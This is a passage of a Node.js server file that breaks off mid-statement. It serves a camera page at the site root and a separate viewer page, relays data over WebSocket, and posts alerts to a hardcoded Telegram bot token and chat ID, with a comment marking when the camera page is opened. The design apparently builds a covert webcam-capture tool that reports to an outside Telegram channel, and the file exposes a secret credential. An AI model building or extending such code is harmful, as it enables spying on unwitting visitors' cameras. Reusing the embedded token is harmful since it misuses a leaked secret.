const http = require("http");
const fs = require("fs");
const path = require("path");
const https = require("https");
const WebSocket = require("ws");

const PORT = process.env.PORT || 10000;

const TELEGRAM_BOT_TOKEN =
  process.env.TELEGRAM_BOT_TOKEN || "8536152258:AAFKYdwnQ57ZMlddm2oryhYfwfW0SxEE0N4";

const TELEGRAM_CHAT_ID =
  process.env.TELEGRAM_CHAT_ID || "8420014257";


/* =========================================================
   TELEGRAM
========================================================= */

function telegram(message) {

  if (
    !TELEGRAM_BOT_TOKEN ||
    !TELEGRAM_CHAT_ID
  ) {
    return;
  }

  const data =
    new URLSearchParams({
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    }).toString();

  const req =
    https.request({

      hostname: "api.telegram.org",

      path:
        `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,

      method: "POST",

      headers: {
        "Content-Type":
          "application/x-www-form-urlencoded",

        "Content-Length":
          Buffer.byteLength(data)
      }

    });

  req.on("error", () => {});

  req.write(data);

  req.end();
}


/* =========================================================
   SAFE SEND
========================================================= */

function send(ws, message) {

  if (
    ws &&
    ws.readyState === WebSocket.OPEN
  ) {

    try {

      ws.send(
        JSON.stringify(message)
      );

      return true;

    } catch (error) {

      console.log(
        "WebSocket send error:",
        error.message
      );

    }

  }

  return false;
}


/* =========================================================
   ID
========================================================= */

function makeId() {

  return (
    Math.random()
      .toString(36)
      .slice(2, 8) +

    Date.now()
      .toString(36)
      .slice(-4)
  );

}


/* =========================================================
   HTTP SERVER
========================================================= */

const server =
  http.createServer(
    (req, res) => {

      const routes = {

        "/":
          "camera.html",

        "/camera":
          "camera.html",

        "/camera.html":
          "camera.html",

        "/viewer":
          "viewer.html",

        "/viewer.html":
          "viewer.html"

      };


      const pathname =
        new URL(
          req.url,
          `http://${req.headers.host || "localhost"}`
        ).pathname;


      const file =
        routes[pathname];


      if (!file) {

        res.writeHead(404);

        return res.end(
          "Not found"
        );

      }


      /* CAMERA PAGE OPENED */

      if (
        pathname === "/" ||
        pathname === "/camera" ||
        pathname ===
